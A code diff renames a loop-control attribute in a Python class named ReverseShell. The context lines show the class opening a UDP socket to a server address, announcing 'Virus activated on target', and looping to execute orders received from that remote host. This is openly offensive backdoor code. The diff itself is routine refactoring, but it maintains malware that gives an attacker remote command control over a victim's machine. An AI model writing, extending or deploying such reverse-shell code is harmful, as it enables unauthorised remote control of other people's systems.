@@ -15,7 +15,7 @@ class ReverseShell:
     """
     def __init__(self, serverIP, serverPort):
 
-        self.run            = True
+        self.isRunning      = True
         self.serverAddress  = (serverIP, serverPort)
         self.client         = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
 
@@ -44,7 +44,7 @@ class ReverseShell:
 
         self.client.sendto(str.encode("Virus activated on target\n"), self.serverAddress)
 
-        while self.run:
+        while self.isRunning:
 
             self.executeOrder(self.client.recvfrom(1024)[0])
 
